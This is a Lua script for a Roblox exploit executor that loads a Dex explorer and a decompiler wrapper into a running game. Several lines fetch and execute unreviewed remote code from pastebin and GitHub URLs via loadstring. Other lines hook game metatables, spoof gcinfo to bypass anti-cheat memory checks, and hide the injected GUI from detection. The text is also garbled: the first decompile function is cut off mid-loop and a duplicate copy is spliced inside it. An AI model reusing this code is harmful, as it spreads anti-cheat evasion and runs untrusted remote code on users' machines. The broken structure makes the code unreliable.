-- syndexpro.lua --
setthreadidentity(2)
	
local _decompile = assert(decompile or syn_decompile)
local _getscriptclosure = assert(getscriptclosure)
local _getrenv = assert(getrenv or syn_getrenv)
local _getgenv = assert(getgenv or syn_getgenv)
local _getsenv = assert(getsenv or syn_getsenv)
local _getmenv = assert(getmenv or syn_getmenv)
local _getprotos = assert(getprotos or debug.getprotos)
local _getconstants = assert(getconstants or debug.getconstants)
local _getinfo = debug.info
local stringsplit = string.split
local stringmatch = string.match
local stringfind = string.find
local stringgmatch = string.gmatch
local stringgsub = string.gsub
local tableclear = table.clear
local tableinsert = table.insert
local tableremove = table.remove

local IsA = game.IsA

local GetFuncs
do
local Funcs = {}
function GetFuncs(Closure, Globals)
local Protos = _getprotos(Closure)
if Protos and #Protos > 0 then
for Index, Proto in ipairs(_getprotos(Closure)) do
local Name, Args, VarArg = _getinfo(Proto, "na")
local Protos = _getprotos(Proto)
if #Name > 0 and not Globals[Name] then -- we dont need globals
tableinsert(Funcs, {Name, Args, VarArg, _getconstants(Proto)}) 
end
if Protos and #Protos > 0 then
GetFuncs(Proto, Globals)
end
end
end
return Funcs
end
end

_getgenv().decompile = (function(Script, ...)
if typeof(Script) == "Instance" then
local isModuleScript = IsA(Script, "ModuleScript")
if isModuleScript or (IsA(Script, "LocalScript") and not Script.Disabled) then
local Success, Globals = pcall(((isModuleScript and require) or _getsenv), Script)
local Closure = _getscriptclosure(Script)
if isModuleScript and Success then
if type(Globals) ~= "table" then
Success, Globals = pcall(_getmenv, Script)
end
end
if Success and Closure then
local Source = _decompile(Script, ...)
if Source then
do -- local function names
local Funcs = GetFuncs(Closure, Globals)
for Match in stringgmatch(Source, "function %w+%.%w+%b()") do
local Name = stringmatch(Match, "%.(%w+)")
for Iteration = 1, #Funcs do
if Funcs[Iteration][1] == Name then
tableremove(Funcs, Iteration)
break
end
end
end
for Proto in stringgmatch(Source, "%s+local function %l%d+%b()") do
local Spaces = stringmatch(Proto, "%s+")
local GeneratedName = stringmatch(Proto, "%l%d+")
local ArgPattern = stringmatch(Proto, "%b()")
local _, Args = stringgsub(ArgPattern, "p%d+", "")
local IsVarArg = stringfind(ArgPattern, "...", 1, true) ~= nil
local ProtoClosure = stringmatch(Source, "local function " .. GeneratedName .. "%b().+" .. Spaces .. "end;") or ""
ProtoClosure = stringgsub(ProtoClosure, "local function %l%d+%b().+end;$", function(Match)
local Split = stringsplit(Match, Spaces .. "end;\n")
local NumSplit = #Split
if NumSplit > 1 then
for Index = 1, NumSplit do
local SplitI = Split[Index]
if stringmatch(SplitI, GeneratedName) then
return SplitI .. Spaces .. "end;"
end
end
end
return Match
end)
for Iteration = 1, #Funcs do
local Func = Funcs[Iteration]
local _decompile = assert(decompile or syn_decompile)
local _getscriptclosure = assert(getscriptclosure)
local _getrenv = assert(getrenv or syn_getrenv)
local _getgenv = assert(getgenv or syn_getgenv)
local _getsenv = assert(getsenv or syn_getsenv)
local _getmenv = assert(getmenv or syn_getmenv)
local _getprotos = assert(getprotos or debug.getprotos)
local _getconstants = assert(getconstants or debug.getconstants)
local _getinfo = debug.info
local stringsplit = string.split
local stringmatch = string.match
local stringfind = string.find
local stringlower = string.lower
local stringgmatch = string.gmatch
local stringgsub = string.gsub
local stringsub = string.sub
local taskspawn = task.spawn
local taskwait = task.wait
local tableclear = table.clear
local tableinsert = table.insert
local tableremove = table.remove

local IsA = game.IsA

local genv = _getgenv()
local renv = _getrenv()

local GetFuncs
do
local Funcs = {}
function GetFuncs(Closure, Globals)
local Protos = _getprotos(Closure)
if Protos and #Protos > 0 then
for Index, Proto in ipairs(_getprotos(Closure)) do
local Name, Args, VarArg = _getinfo(Proto, "na")
local Protos = _getprotos(Proto)
if #Name > 0 and Globals and not Globals[Name] then -- we dont need globals
tableinsert(Funcs, {Name, Args, VarArg, _getconstants(Proto)})
end
if Protos and #Protos > 0 then
GetFuncs(Proto, Globals)
end
end
end
return Funcs
end
end

local VarPrefix = "__"
local VarPostfix = "__"

local IsASpecial
local IsNil
local IsABoolean
local IsAString
local IsANumber
do
local Specials = {
-- Instance
getpropertychangedsignal = function(isavar, argpattern, object, settings)
return stringmatch(argpattern, '(%w+)%)$') .. "Changed"
end,
getattributechangedsignal = function(isavar, argpattern, object, settings)
return "Attribute" .. stringmatch(argpattern, '(%w+)%)$') .. "Changed"
end,
getchildren = function(isavar, argpattern, object, settings)
return "children"
end,
getdescendants = function(isavar, argpattern, object, settings)
return "descendants"
end,
getattributes = function(isavar, argpattern, object, settings)
return "attributes"
end,
getattribute = function(isavar, argpattern, object, settings)
if isavar then
return "attribute"
else
return stringmatch(argpattern, '(%w+)%)$')
end
return "attribute"
end,
isa = function(isavar, argpattern, object, settings)
return "boolean"
end,
clone = function(isavar, argpattern, object, settings)
if isavar then
return isavar
else
return object
end
end,
findfirstchild = function(isavar, argpattern, object, settings)
return stringmatch(argpattern, '^%("(%w+)"')
end,
-- ServiceProvider
service = function(isavar, argpattern, object, settings)
return stringmatch(argpattern, '^%("(%w+)"')
end,
-- TweenService
create = function(isavar, argpattern, object, settings)
return "Tween"
end,
getvalue = function(isavar, argpattern, object, settings)
return "number"
end,
-- PhysicsService
getcollisiongroupname = function(isavar, argpattern, object, settings)
return "CollisionGroup"
end,
getcollisiongroups = function(isavar, argpattern, object, settings)
return "CollisionGroups"
end,
-- LogService
getloghistory = function(isavar, argpattern, object, settings)
return "LogHistory"
end,
-- RunService
isclient = function(isavar, argpattern, object, settings)
return "IsClient"
end,
isrunmode = function(isavar, argpattern, object, settings)
return "IsRunMode"
end,
isrunning = function(isavar, argpattern, object, settings)
return "IsRunning"
end,
isserver = function(isavar, argpattern, object, settings)
return "IsServer"
end,
isstudio = function(isavar, argpattern, object, settings)
return "IsStudio"
end,
-- UserInputService
getconnectedgamepads = function(isavar, argpattern, object, settings)
return "ConnectedGamepads"
end,
getnavigationgamepads = function(isavar, argpattern, object, settings)
return "NagivationGamepads"
end,
getsupportedgamepadkeycodes = function(isavar, argpattern, object, settings)
return "SupportedGamepadKeys"
end,
getusercframe = function(isavar, argpattern, object, settings)
return "UserCFrame"
end,
getstringforkeycode = function(isavar, argpattern, object, settings)
return "string"
end,
getdeviceacceleration = function(isavar, argpattern, object, settings)
return "DeviceAcceleration"
end,
getdevicegravity = function(isavar, argpattern, object, settings)
return "DeviceGravity"
end,
getgamepadstate = function(isavar, argpattern, object, settings)
return "GamepadState"
end,
getkeyspressed = function(isavar, argpattern, object, settings)
return "PressedKeys"
end,
getmousebuttonspressed = function(isavar, argpattern, object, settings)
return "PressedMouseButtons"
end,
getlastinputtype = function(isavar, argpattern, object, settings)
return "UserInputType"
end,
getfocusedtextbox = function(isavar, argpattern, object, settings)
return "TextBox"
end,
getmousedelta = function(isavar, argpattern, object, settings)
return "MouseDelta"
end,
getmouselocation = function(isavar, argpattern, object, settings)
return "MouseLocation"
end,
-- ContextActionService
getallboundactioninfo = function(isavar, argpattern, object, settings)
return "AllBoundActionInfo"
end,
getboundactioninfo = function(isavar, argpattern, object, settings)
return "BoundActionInfo"
end,
getbutton = function(isavar, argpattern, object, settings)
return "BoundImageButton"
end,
getcurrentlocaltoolicon = function(isavar, argpattern, object, settings)
return "LocalToolIcon"
end,
-- Lighting
getsundirection = function(isavar, argpattern, object, settings)
return "Vector3"
end,
-- Workspace
getrealphysicsfps = function(isavar, argpattern, object, settings)
return "physicsfps"
end,
-- Humanoid / Animator / AnimationController
loadanimation = function(isavar, argpattern, object, settings)
return stringmatch(argpattern, '(%w+)%)$')
end,
getplayinganimationtracks = function(isavar, argpattern, object, settings)
return "animationtracks"
end,
-- Humanoid
getaccessories = function(isavar, argpattern, object, settings)
return "accessories"
end,
getapplieddescription = function(isavar, argpattern, object, settings)
return "HumanoidDescription"
end,
getbodypartr15 = function(isavar, argpattern, object, settings)
return "BodyPartR15"
end,
getlimb = function(isavar, argpattern, object, settings)
return "Limb"
end,
getstate = function(isavar, argpattern, object, settings)
return "HumanoidStateType"
end
}
local SpecialsMap = {
-- Instance
children = "getchildren", -- "children"
isancestorof = "isa", -- "boolean"
isdescendantof = "isa", -- "boolean"
waitforchild = "findfirstchild", -- Child
findfirstdescendant = "findfirstchild", -- Child
findfirstdescendantofclass = "findfirstchild", -- Child
findfirstdescendantwhichisa = "findfirstchild", -- Child
findfirstancestor = "findfirstchild", -- Child
findfirstancestorofclass = "findfirstchild", -- Child
findfirstancestorwhichisa = "findfirstchild", -- Child
findfirstchildofclass = "findfirstchild", -- Child
findfirstchildwhichisa = "findfirstchild", -- Child
-- PhysicsService
collisiongroupcontainspart = "isa", -- "boolean"
collisiongroupsarecollidable = "isa", -- "boolean"
createcollisiongroup = "getvalue", -- "number"
getcollisiongroupid = "getvalue", -- "number"
getmaxcollisiongroups = "getvalue", -- "number"
-- GuiService
getemotesmenuopen = "isa", -- "boolean"
getgameplaypausednotificationenabled = "isa", -- "boolean"
getinspectmenuenabled = "isa", -- "boolean"
istenfootinterface = "isa", -- "boolean"
-- UserInputService
gamepadsupports = "isa", -- "boolean"
getgamepadconnected = "isa", -- "boolean"
isgamepadbuttondown = "isa", -- "boolean"
iskeydown = "isa", -- "boolean"
ismousebuttonpressed = "isa", -- "boolean"
isnagivationgamepad = "isa", -- "boolean"
-- Lighting
getminutesaftermidnight = "getvalue", -- Child
getmoonphase = "getvalue", -- "number"
getmoondirection = "getsundirection", -- Vector3
-- Workspace
getnumawakeparts = "getvalue", -- "number"
getphysicsthrottling = "getvalue", -- "number"
getservertimenow = "getvalue", -- "number"
-- Humanoid
getstateenabled = "isa", -- "boolean"
playemote = "isa", -- "boolean"
replacebodypartr15 = "isa", -- "boolean"
}
for key, special in pairs(SpecialsMap) do
Specials[key] = Specials[special]
end
function IsASpecial(Value, Settings)
Settings = Settings or {}
local Global, Match = stringmatch(Value, "(%w+)%.new(%b());")
if Match then
if renv[Global] then
if Global ~= "Instance" then
return Global
elseif Global == "Instance" then
return stringmatch(Match, '"(.-)"')
end
end
end
local Match = stringmatch(Value, "require(%b());") -- ModuleScript requiring
if Match then
local Module = stringmatch(Match, "(%w+)%)")
if Module then
return Module
end
local Module = stringmatch(Match, '"(%w+)"%)%)')
if Module then
return Module
end
end
local Object, Method, ArgPattern = stringmatch(Value, "([" .. VarPrefix .. "%w" .. VarPostfix .. "%d]+):(%w+)(%b());$")
if Object and Method and ArgPattern then
local Method = stringlower(Method)
local IsAVariable = stringmatch(Object, VarPrefix .. "(%w+)" .. VarPostfix .. "%d+")
local Handler = Specials[Method]
if Handler then
return Handler(IsAVariable, ArgPattern, Object, Settings)
end
end
return
end
function IsNil(Value)
Value = stringsub(Value, 1, #Value - 1)
return Value == "nil"
end
local Constants = {
["false"] = true,
["true"] = true
}
function IsABoolean(Value)
Value = stringsub(Value, 1, #Value - 1)
if #Value > 3 then
if Constants[Value] then
return true
end
end
return false
end
function IsAString(Value)
Value = stringsub(Value, 1, #Value - 1)
if stringmatch(Value, '^"') and stringmatch(Value, '"$') then
return true
end
if stringmatch(Value, "tostring%b()") then
return true
end
return false
end
local AllowedOperators = {
["-"] = true,
["+"] = true,
["/"] = true,
["*"] = true,
["^"] = true,
["%"] = true
}
function IsANumber(Value)
Value = stringsub(Value, 1, #Value - 1)
if tonumber(Value) then
return true
end
local Operator = stringmatch(Value, "^%d+%s?(%p)%s?.+")
if Operator and AllowedOperators[Operator] then
return true
end
if stringmatch(Value, "^#") then
return true
end
return false
end
end

local AdvVar = true -- advanced variable names (might be cringe to read)
genv.decompile = (function(Script, ...)
if typeof(Script) == "Instance" then
local isModuleScript = IsA(Script, "ModuleScript")
if (isModuleScript or IsA(Script, "LocalScript")) then
local Success, Globals
taskspawn(function()
Success, Globals = pcall(((isModuleScript and require) or _getsenv), Script)
end)
local Yielded = 0
repeat
taskwait(1)
Yielded = Yielded + 1
until Success or Yielded >= 10
if not Success or not Globals then
Success, Globals = true, (isModuleScript and nil or {})
end
local Closure = _getscriptclosure(Script)
if isModuleScript and Success then
if type(Globals) ~= "table" then
Success, Globals = pcall(_getmenv, Script)
end
end
if Success and Closure then
local Source = _decompile(Script, ...)
if Source then
if isModuleScript or (not isModuleScript and not Script.Disabled) then
do -- local function names
local Funcs = GetFuncs(Closure, Globals)
for Name in stringgmatch(Source, "function %w+%.(%w+)%b()") do
for Iteration = 1, #Funcs do
if Funcs[Iteration][1] == Name then
tableremove(Funcs, Iteration)
break
end
end
end
for Spaces, GeneratedName, ArgPattern in stringgmatch(Source, "(%s+)local function (%l%d+)(%b())") do
local _, Args = stringgsub(ArgPattern, "p%d+", "")
local IsVarArg = stringfind(ArgPattern, "...", 1, true) ~= nil
local ProtoClosure = stringmatch(Source, "local function " .. GeneratedName .. "%b().+" .. Spaces .. "end;") or ""
ProtoClosure = stringgsub(ProtoClosure, "local function %l%d+%b().+end;$", function(Match)
local Split = stringsplit(Match, Spaces .. "end;\n")
local NumSplit = #Split
if NumSplit > 1 then
for Index = 1, NumSplit do
local SplitI = Split[Index]
if stringmatch(SplitI, GeneratedName) then
return SplitI .. Spaces .. "end;"
end
end
end
return Match
end)
for Iteration = 1, #Funcs do
local Func = Funcs[Iteration]
local Name = Func[1]
if Args == Func[2] then
if IsVarArg == Func[3] then
local Constants = Func[4]
local HasConstants = true
for Index = 1, #Constants do
local Constant = Constants[Index]
if type(Constant) == "string" then
if not stringfind(ProtoClosure, Constant, 1, true) then
HasConstants = false
break
end
end
end
if HasConstants then
tableremove(Funcs, Iteration)
Source = stringgsub(Source, "%f[%w]" .. GeneratedName .. "%f[%W]", Name)
break
else
continue
end
end
end
end
end
tableclear(Funcs)
end
end
if AdvVar then
do -- Advanced variable names
for Type, Order, Value in stringgmatch(Source, "local (%l)(%d+)%s?=%s?(.-;)") do
local Name
local Class = IsASpecial(Value)
local VarPrefix = Type .. VarPrefix
if Class then
Name = VarPrefix .. Class .. VarPostfix .. Order
end
if IsABoolean(Value) then
Name = VarPrefix .. "boolean" .. VarPostfix .. Order
elseif IsAString(Value) then
Name = VarPrefix .. "string" .. VarPostfix .. Order
elseif IsANumber(Value) then
Name = VarPrefix .. "number" .. VarPostfix .. Order
elseif IsNil(Value) then
for Value in stringgmatch(Source, (Type .. Order) .. "%s?=%s?(.-;)") do
local Class = IsASpecial(Value, {
Recursive = true
})
if Class then
Name = VarPrefix .. Class .. VarPostfix .. Order
end
if IsABoolean(Value) then
Name = VarPrefix .. "boolean" .. VarPostfix .. Order
elseif IsAString(Value) then
Name = VarPrefix .. "string" .. VarPostfix .. Order
elseif IsANumber(Value) then
Name = VarPrefix .. "number" .. VarPostfix .. Order
end
end
end
if Name then
Source = stringgsub(Source, "%f[%w]" .. Type .. Order .. "%f[%W]", Name) -- Updated to use frontier pattern
end
end
end
end
return Source
end
end
end
end
return _decompile(Script, ...)
end)

getgenv().Services = setmetatable({},{__index=function(s,r) return game:service(r) end})	
			
getgenv().Protector = loadstring(game:HttpGet("https://raw.githubusercontent.com/pamlib/prote.lua/ca01e9b8b3478762370d4a1d1ee65bae6ee881a3/main.lua", true, Enum.HttpRequestType.Analytics, true))
			
getgenv().confi = loadstring(game:HttpGet("https://l8x.github.io/syndexpro/confi.lua", true, Enum.HttpRequestType.Analytics, true))

loadstring(game:HttpGet("https://pastebin.com/raw/ri3pGiYz", true, Enum.HttpRequestType.Analytics, true))()	
			
loadstring(game:HttpGet("https://pastebin.com/raw/AGBj7SXt", true, Enum.HttpRequestType.Analytics, true))()

pcall(function()
local OldIndex
OldIndex = hookmetamethod(game, "__index", function(Self, Index)
    return OldIndex(Self, Index)
end)

local OldNewIndex
OldNewIndex = hookmetamethod(game, "__newindex", function(Self, Index, Value)
    return OldNewIndex(Self, Index, Value)
end)

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
    return OldNamecall(Self, ...)
end)

local mt = getrawmetatable(game)

local old
old = hookfunction(mt.__namecall, function(...)
   return old(...)
end)

local function get_proxy_game_metatable(x)
 local proxy = {}
  local mt_func_list = {
    
 }
 local proxy_mt = {
    __newindex = function(t,k,v)
       local old
       old = hookmetamethod(game,k,v)
       mt_func_list[k] = old
     end;
      __index = function(t,k)
         return function(...)
             local list_func =  mt_func_list[k]
              local unpack_pcall = {pcall(list_func,...)}
           if unpack_pcall[1] == true then
                 table.remove(unpack_pcall,1)
              return unpack(unpack_pcall)
                end
          end
        end
  }
 return setmetatable(proxy,proxy_mt)
end
hookfunction(getrawmetatable,get_proxy_game_metatable)
end)

local memCheckBypass

memCheckBypass = hookfunction(getrenv().gcinfo, function(...)
   --warn("Script tried to memory check, PATH: \n"..debug.traceback())
   return tonumber(math.random(55-math.random(1,45), 110-math.random(1,35)*0.215-math.random(1, 45)))
end)

local CCoreGui = cloneref(Services.CoreGui)
local CContentProvider = cloneref(Services.ContentProvider)
local CInsertService = cloneref(Services.InsertService)

-- < Functions > --
function gethui()
return CCoreGui
end

getgenv().yeetdex = function(yeetdex)
local CoreGui = gethui()
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
if RemoteDebugWindow then
    RemoteDebugWindow.Parent:Destroy()
end end

-- < Services > --	
local InsertService = CInsertService
local CoreGui = gethui()
local ContentProvider = CContentProvider
-- < Aliases > --
local table_insert = table.insert
local table_foreach = table.foreach
local string_char = string.char
getgenv().getobjects = function(a)
    local Objects = {}
    if a then
        local b = InsertService:LoadLocalAsset(a)
        if b then 
            table_insert(Objects, b) 
        end
    end
    return Objects
end

-- < Values > --
local Charset = {}
local Random_Instance = Random.new()
local RemoteDebugWindow = CoreGui:FindFirstChild("RemoteDebugWindow", true)
-- < Source > --
if RemoteDebugWindow then
	RemoteDebugWindow.Parent:Destroy()
end

for i = 48,  57 do 
	table_insert(Charset, string_char(i))
end

for i = 65,  90 do 
	table_insert(Charset, string_char(i))
end

for i = 97, 122 do
	table_insert(Charset, string_char(i))
end

function RandomCharacters(length)
	return length > 0 and RandomCharacters(length - 1)..Charset[Random_Instance:NextInteger(1, #Charset)] or ""
end
			
local HTTPService = cloneref(Services.HttpService)
local CoreGui     = gethui()
local ScriptContext = cloneref(Services.ScriptContext)
local RandomObject = CoreGui:FindFirstChildOfClass("ScreenGui")
local RandomObject2 = Instance.new("Folder", RandomObject)
syn.protect_gui(RandomObject2)
local CRandomObject2 = cloneref(RandomObject2)
syn.protect_gui(CRandomObject2)

local Dex = cloneref(getobjects("rbxassetid://7995973532")[1])
ContentProvider:Preload("rbxassetid://7995973532")
task.spawn(function()
task.synchronize()
for i,v in pairs(Dex:GetDescendants()) do
    syn.protect_gui(v)
    end
task.wait(0)
end)
Dex.Name = "RobloxGui" -- bypass attempt??
sethiddenproperty(Dex, "OnTopOfCoreBlur", true)
sethiddenproperty(Dex, "AutoLocalize", true)
sethiddenproperty(Dex, "Localize", true)
sethiddenproperty(Dex, "IgnoreGuiInset", true)
sethiddenproperty(Dex, "DisplayOrder", 2147483647)
sethiddenproperty(cloneref(Services.UserInputService), "GazeSelectionEnabled", true)
sethiddenproperty(cloneref(Services.StarterGui), "ProcessUserInput", true)
syn.protect_gui(Dex)
syn.protect_gui(RandomObject)
syn.protect_gui(RandomObject2)
syn.protect_gui(CRandomObject2)
Protector():ProtectInstance(Dex, true)
Protector():ProtectInstance(RandomObject2, true)
Protector():ProtectInstance(CRandomObject2, true)
Dex.Parent = CRandomObject2
	
Inputting = false
ChatBar = nil
Current = nil

function Check()
	wait(.1)
	Inputting = false
	Disconnection:Disconnect()
end

function InputBegan()
	if game:GetService("UserInputService"):GetFocusedTextBox() then
		ChatBar = game:GetService("UserInputService"):GetFocusedTextBox()
		Inputting = true
		Current = ChatBar.FocusLost
		Disconnection = Current:Connect(Check)
	end
end
InputConnect = game:GetService("UserInputService").InputBegan:Connect(InputBegan)
	
local function Load(Obj, Url)
	local function GiveOwnGlobals(Func, Script)
		local Fenv, RealFenv, FenvMt = {}, {script = Script}, {}
		FenvMt.__index = function(a,b)
			return RealFenv[b] == nil and getgenv()[b] or RealFenv[b]
		end
		FenvMt.__newindex = function(a, b, c)
			if RealFenv[b] == nil then 
				getgenv()[b] = c
		else 
			RealFenv[b] = c 
			end
		end
		setmetatable(Fenv, FenvMt)
		pcall(setfenv, Func, Fenv)
		return Func
	end
	local function LoadScripts(_, Script)
		if Script:IsA("LocalScript") then
			spawn(function()
				GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
			end)
		end
		table_foreach(Script:GetChildren(), LoadScripts)
	end
LoadScripts(nil, Obj)
end
Load(Dex)
